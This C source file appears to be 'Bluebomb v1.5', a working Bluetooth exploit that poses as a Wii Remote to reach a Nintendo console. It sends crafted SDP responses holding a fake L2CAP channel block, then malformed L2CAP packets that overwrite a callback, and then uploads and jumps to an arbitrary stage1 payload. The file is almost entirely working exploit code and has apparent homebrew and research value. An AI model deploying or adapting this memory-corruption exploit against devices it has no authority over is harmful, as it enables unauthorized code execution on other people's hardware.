/*  Copyright 2019-2020  Dexter Gerig  <dexgerig@gmail.com>
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <endian.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#include "libminibt.h"
#include "stage0_bin.h"

#include "stream_macros.h"

void* get_file(char *name, int *out_len) {
	FILE *f = fopen(name, "rb");
	if (f == NULL) {
		if (out_len)
			*out_len = 0;
		return NULL;
	}
	
	fseek(f, 0L, SEEK_END);
	size_t length = ftell(f);
	rewind(f);
	
	void *data = malloc(length);
	if (data == NULL) {
		fclose(f);
		if (out_len)
			*out_len = 0;
		return NULL;
	}
	
	fread(data, 1, length, f);
	fclose(f);
	
	if (out_len)
		*out_len = length;
	return data;
}

void do_hax(int raw_sock, int device_handle) {
	// Chain these packets together so things are more deterministic.
	int bad_packet_len = L2CAP_PAYLOAD_LENGTH + 6;
	int empty_packet_len = L2CAP_PAYLOAD_LENGTH;
	int total_length = L2CAP_HEADER_LENGTH + bad_packet_len + empty_packet_len;
	struct l2cap_packet *hax = malloc(total_length);
	struct l2cap_payload *p = &hax->payload;
	
	hax->length = htole16(bad_packet_len + empty_packet_len);
	hax->cid = htole16(0x0001);
	
	printf("Overwriting callback in switch case 0x9.\n");
	
	p->opcode = 0x01; // L2CAP_CMD_REJECT
	p->id = 0x00;
	p->length = htole16(0x0006);
	uint8_t *d = &p->data[0];
	
	UINT16_TO_STREAM(d, 0x0002); // L2CAP_CMD_REJ_INVALID_CID
	UINT16_TO_STREAM(d, 0x0000); // rcid (from faked ccb)
	UINT16_TO_STREAM(d, 0x0040 + 0x1f); // lcid
	
	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
	
	printf("Trigger switch statement 0x9.\n");
	
	p->opcode = 0x09; // L2CAP_CMD_ECHO_RSP which will trigger a callback to our payload
	p->id = 0x00;
	p->length = htole16(0x0000);
	
	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
	
	printf("Sending hax\n");
	send_acl_packet(raw_sock, device_handle, hax, total_length);
	free(hax);
	
	printf("Awaiting response from stage0\n");
	int ret = await_response(raw_sock, 0x5330); // 'S0'
	if (ret < 0) {
		printf("Didn't find response from stage0\n");
		return;
	}
	printf("Got response!\n");
}

struct ccb {
	uint8_t in_use;
	uint32_t chnl_state;
	uint32_t p_next_ccb;
	uint32_t p_prev_ccb;
	uint32_t p_lcb;
	uint16_t local_cid;
	uint16_t remote_cid;
	// We only go up to the fields we care about, you should still leave the rest blank as there are some fields that should be just left zero after it like the timer object.
};

// TODO: Figure out the real MTU instead of choosing semi-random numbers
#define SDP_MTU 0xD0

void send_sdp_service_response(uint32_t L2CB, int fd) {
	uint16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
	uint32_t SDP_CB = L2CB + 0xc00;
	
	uint8_t *response = malloc(required_size);
	memset(response, 0x00, required_size);
	uint8_t *p = response;
	
	struct ccb fake_ccb;
	memset(&fake_ccb, 0x00, sizeof(struct ccb));
	fake_ccb.in_use = 1;
	fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
	fake_ccb.p_next_ccb = htobe32(SDP_CB + 0x68);
	fake_ccb.p_prev_ccb = htobe32(L2CB + 8 + 0x54 - 8);
	fake_ccb.p_lcb = htobe32(L2CB + 0x8);
	fake_ccb.local_cid = htobe16(0x0000);
	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
	
	UINT8_TO_BE_STREAM(p, 0x03); // SDP_ServiceSearchResponse
	UINT16_TO_BE_STREAM(p, 0x0001); // Transaction ID (ignored, no need to keep track of)
	UINT16_TO_BE_STREAM(p, 0x0059); // ParameterLength
	UINT16_TO_BE_STREAM(p, 0x0015); // TotalServiceRecordCount
	UINT16_TO_BE_STREAM(p, 0x0015); // CurrentServiceRecordCount
	memcpy(p + (0xa * 4), &fake_ccb, sizeof(struct ccb)); p += (0x15 * 4); // Embed payload in ServiceRecordHandleList
	UINT8_TO_BE_STREAM(p, 0x00); // ContinuationState
	
	send(fd, response, p - response, 0);
	
	uint8_t *reply = malloc(0x200);
	recv(fd, reply, 0x200, 0); // TODO: Check the reply for errors so we can catch things going wrong earlier.
	free(reply);
	free(response);
	
	return;
}

void send_sdp_attribute_response(int fd, void* payload, int len) {
	uint16_t required_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1;
	
	uint8_t *response = malloc(required_size);
	memset(response, 0x00, required_size);
	uint8_t *p = response;
	
	UINT8_TO_BE_STREAM(p, 0x05); // SDP_ServiceAttributeResponse
	UINT16_TO_BE_STREAM(p, 0x0001); // Transaction ID (ignored, no need to keep track of)
	UINT16_TO_BE_STREAM(p, 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1); // ParameterLength
	UINT16_TO_BE_STREAM(p, 1 + 1 + 1 + 2 + 1 + SDP_MTU); // AttributeListByteCount
	UINT8_TO_BE_STREAM(p, 0x35); // DATA_ELE_SEQ_DESC_TYPE and SIZE_1
	UINT8_TO_BE_STREAM(p, 0x02); // size of data elements
	UINT8_TO_BE_STREAM(p, 0x09); // UINT_DESC_TYPE and SIZE_2
	UINT16_TO_BE_STREAM(p, 0xbeef); // The dummy int
	UINT8_TO_BE_STREAM(p, 0x00); // padding so instruction is 0x4 aligned
	memcpy(p, payload, len > SDP_MTU ? SDP_MTU : len); p += (len > SDP_MTU ? SDP_MTU : len); // payload
	UINT8_TO_BE_STREAM(p, len <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
	
	send(fd, response, p - response, 0);
	
	uint8_t *reply = malloc(0x200);
	recv(fd, reply, 0x200, 0); // TODO: Same
	
	int rem = len - SDP_MTU;
	while (rem > 0) {
		memset(response, 0x00, required_size);
		p = response;
		
		// We don't have to care about giving a valid attribute sequence this time so just stick the payload right in.
		UINT8_TO_BE_STREAM(p, 0x05); // SDP_ServiceAttributeResponse
		UINT16_TO_BE_STREAM(p, 0x0001); // Transaction ID (ignored, no need to keep track of)
		UINT16_TO_BE_STREAM(p, 2 + SDP_MTU + 1); // ParameterLength
		UINT16_TO_BE_STREAM(p, SDP_MTU); // AttributeListByteCount
		memcpy(p, payload + len - rem, rem > SDP_MTU ? SDP_MTU : rem); p += (rem > SDP_MTU ? SDP_MTU : rem); // payload
		UINT8_TO_BE_STREAM(p, rem <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
		
		send(fd, response, p - response, 0);
		
		recv(fd, reply, 0x200, 0); // TODO: Same
		rem -= SDP_MTU;
	}
	
	free(reply);
	free(response);
	return;
}

#define PAYLOAD_MTU 0x200

void upload_payload(int fd, int device_handle, void* data, uint32_t size) {
	int segments = size / PAYLOAD_MTU;
	int ret = 0;
	
	printf("0 / %d", size);
	fflush(stdout);
	for (int i = 0; i < segments; i++) {
		int upload_packet_len = L2CAP_PAYLOAD_LENGTH + PAYLOAD_MTU;
		int total_length = L2CAP_HEADER_LENGTH + upload_packet_len;
		struct l2cap_packet *upload = malloc(total_length);
		struct l2cap_payload *p = &upload->payload;
		
		upload->length = htole16(upload_packet_len);
		upload->cid = htole16(0x0001);
		
		p->opcode = 0x09; // L2CAP_CMD_UPLOAD_PAYLOAD
		p->id = 0x00; // CONTINUE_REQUEST
		p->length = htole16(PAYLOAD_MTU);
		
		memcpy(&p->data[0], data + (i * PAYLOAD_MTU), PAYLOAD_MTU);
		
		printf("\r%d / %d", i * PAYLOAD_MTU, size);
		fflush(stdout);
		send_acl_packet(fd, device_handle, upload, total_length);
		free(upload);
		ret = await_response(fd, 0x4744);
		if (ret < 0) {
			printf("\nDidn't find response from stage0\n");
			return;
		}
	}
	
	if ((size % PAYLOAD_MTU) != 0) {
		int remainder = size % PAYLOAD_MTU;
		int upload_packet_len = L2CAP_PAYLOAD_LENGTH + remainder;
		int total_length = L2CAP_HEADER_LENGTH + upload_packet_len;
		struct l2cap_packet *upload = malloc(total_length);
		struct l2cap_payload *p = &upload->payload;
		
		upload->length = htole16(upload_packet_len);
		upload->cid = htole16(0x0001);
		
		p->opcode = 0x09; // L2CAP_CMD_UPLOAD_PAYLOAD
		p->id = 0x00; // CONTINUE_REQUEST
		p->length = htole16(remainder);
		
		memcpy(&p->data[0], data + size - remainder, remainder);
		
		printf("\r%d / %d", size, size);
		fflush(stdout);
		send_acl_packet(fd, device_handle, upload, total_length);
		free(upload);
		ret = await_response(fd, 0x4744);
		if (ret < 0) {
			printf("\nDidn't find response from stage0\n");
			return;
		}
	}
	printf("\n");
}

void jump_payload(int fd, int device_handle) {
	int jump_packet_len = L2CAP_PAYLOAD_LENGTH;
	int total_length = L2CAP_HEADER_LENGTH + jump_packet_len;
	struct l2cap_packet *jump = malloc(total_length);
	struct l2cap_payload *p = &jump->payload;
	
	jump->length = htole16(jump_packet_len);
	jump->cid = htole16(0x0001);
	
	p->opcode = 0x09; // L2CAP_CMD_UPLOAD_PAYLOAD
	p->id = 0x01; // JUMP_PAYLOAD
	p->length = htole16(0x0000);
	
	send_acl_packet(fd, device_handle, jump, total_length);
	free(jump);
}

int init_bt(int raw_sock, int ctrl_sock, int hci_dev) {
	int err = 0;
	
	for (int i = 0; i < 3; i++) {
		printf("Powering on device\n");
		if ((err = mgmt_power_device(ctrl_sock, hci_dev, 1)) != 0) {
			printf("Failed to power on device: %d\n", err);
			goto try_again;
		}
		
		printf("Setting device connectable\n");
		if ((err = mgmt_set_connectable(ctrl_sock, hci_dev, 1)) != 0) {
			printf("Failed to make device connectable: %d\n", err);
			goto try_again;
		}
		
		printf("Setting device bondable\n");
		if ((err = mgmt_set_bondable(ctrl_sock, hci_dev, 1)) != 0) {
			printf("Failed to make device bondable: %d\n", err);
			goto try_again;
		}
		
		printf("Setting device discoverable\n");
		if ((err = mgmt_set_discoverable(ctrl_sock, hci_dev, 1, 0x7fff)) != 0) {
			printf("Failed to make device discoverable: %d\n", err);
			goto try_again;
		}
		
		printf("Setting device local name\n");
		if ((err = mgmt_set_local_name(ctrl_sock, hci_dev, "Nintendo RVL-CNT-01")) != 0) {
			printf("Failed to set device local name: %d\n", err);
			goto try_again;
		}
		
		printf("Setting IAC LAP\n");
		uint32_t lap = 0x9e8b00; // Limited Inquiry Access Code
		if ((err = bt_set_iac_lap(raw_sock, 1, &lap)) != 0) {
			printf("Failed to set IAC LAP: %d %s\n", err, err < 0 ? strerror(errno) : "");
			goto try_again;
		}
		
		printf("Enabling Inquiry+Page scanning\n");
		if ((err = bt_set_device_scan(raw_sock, 3)) != 0) {
			printf("Failed to enable scanning: %d %s\n", err, err < 0 ? strerror(errno) : "");
			goto try_again;
		}
		
		return 0;
		
		try_again:
		sleep(3); // Give it some time for the device to stablize
	}
	
	return -1;
}

int main(int argc, char *argv[]) {
	int hci_dev = 0;
	int l2cap_sock = -1;
	int con = -1;
	int raw_sock = -1;
	int ctrl_sock = -1;
	struct sockaddr_l2 l2addr;
	char *stage0_name = NULL;
	int stage0_length = 0;
	void* stage0 = NULL;
	char *stage1_name = NULL;
	int stage1_length = 0;
	void* stage1 = NULL;
	uint32_t payload_addr = 0x81780000; // 512K before the end of mem 1
	uint32_t L2CB = 0;
	
	printf("Bluebomb v1.5\n");
	
	if (argc != 3 && argc != 4) {
		printf("Usage:\n");
		printf("\t%s [hci-device-number] <target-app-bin> <stage1-bin>\n", argv[0]);
		printf("\t[] = optional\n");
		printf("\t<> = required\n");
		return 0;
	}
	
	if (argc == 4) {
		hci_dev = (int)strtol(argv[1], NULL, 10);
		stage0_name = argv[2];
		stage1_name = argv[3];
	} else {
		stage0_name = argv[1];
		stage1_name = argv[2];
	}
	
	stage0 = get_file(stage0_name, &stage0_length);
	if (stage0 == NULL) {
		printf("Failed to open stage0: %s\n", stage0_name);
		goto err_out;
	}
	
	if (stage0_length != 4) {
		printf("Invalid payload file\n");
		printf("Please use the ones from the 1.5 release, not the old ones\n");
		goto err_out;
	}
	
	L2CB = be32toh(*(uint32_t*)stage0);
	
	if (L2CB >= 0x81000000) {
		printf("Detected system menu\n");
		payload_addr = 0x80004000;
	}
	
	printf("App settings:\n");
	printf("\tL2CB: 0x%08X\n", L2CB);
	printf("\tpayload_addr: 0x%08X\n", payload_addr);
	
	*(uint32_t*)(stage0_bin + 0x8) = htobe32(payload_addr);
	
	printf("Opening raw handle for device hci%d\n", hci_dev);
	raw_sock = hci_open_raw_dev(hci_dev);
	if (raw_sock < 0) {
		printf("Failed to open: %s\n", strerror(errno));
		goto err_out;
	}
	
	printf("Opening control handle for device hci%d\n", hci_dev);
	ctrl_sock = hci_open_control_dev(hci_dev);
	if (ctrl_sock < 0) {
		printf("Failed to open: %s\n", strerror(errno));
		goto err_out;
	}
	
	printf("Configuring device\n");
	if (init_bt(raw_sock, ctrl_sock, hci_dev) < 0) {
		printf("Failed to configure device\n");
		goto err_out;
	}
	
	l2cap_sock = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
	if (l2cap_sock < 0) {
		printf("Error opening l2cap socket: %s\n", strerror(errno));
		goto err_out;
	}
	
	memset(&l2addr, 0, sizeof(l2addr));
	l2addr.l2_family = AF_BLUETOOTH;
	bacpy(&l2addr.l2_bdaddr, BDADDR_ANY);
	l2addr.l2_psm = htobs(0x0001); // SDP_PSM
	
	if (bind(l2cap_sock, (struct sockaddr *) &l2addr, sizeof(l2addr)) < 0) {
		printf("Error binding to l2cap socket: %s\n", strerror(errno));
		goto err_out;
	}
	
	if (listen(l2cap_sock, 5) < 0) {
		printf("Error listening to l2cap socket: %s\n", strerror(errno));
		goto err_out;
	}
	
	struct sockaddr_l2 addr;
	socklen_t len = sizeof(addr);
	
	printf("Waiting to accept\n");
	con = accept(l2cap_sock, (struct sockaddr *) &addr, &len);
	if (con < 0) {
		printf("Error accepting connection: %s\n", strerror(errno));
		goto err_out;
	}
	
	// handle should now be waiting for us
	int device_handle = get_device_handle(raw_sock);
	printf("Got connection handle: %d\n", device_handle);
	if (device_handle < 0) {
		printf("Failed to find HCI connection handle\n");
		goto err_out;
	}
	
	//TODO: Leak shit
	
	printf("Sending SDP service response\n");
	send_sdp_service_response(L2CB, con);
	
	printf("Sending SDP attribute response\n");
	send_sdp_attribute_response(con, stage0_bin, stage0_bin_len);
	
	printf("Sleeping for 5 seconds to try to make sure stage0 is flushed\n");
	sleep(5);
	
	printf("Doing hax\n");
	do_hax(raw_sock, device_handle);
	
	stage1 = get_file(stage1_name, &stage1_length);
	if (stage1 == NULL) {
		printf("Failed to open stage1: %s\n", stage1_name);
		goto err_out;
	}
	
	printf("Uploading payload...\n");
	upload_payload(raw_sock, device_handle, stage1, stage1_length);
	printf("Jumping to payload!\n");
	jump_payload(raw_sock, device_handle);
	
err_out:
	free(stage0);
	free(stage1);
	if (l2cap_sock >= 0)
		close(l2cap_sock);
	if (con >= 0)
		close(con);
	if (raw_sock >= 0)
		close(raw_sock);
	if (ctrl_sock >= 0)
		close(ctrl_sock);
	
	return 0;
}
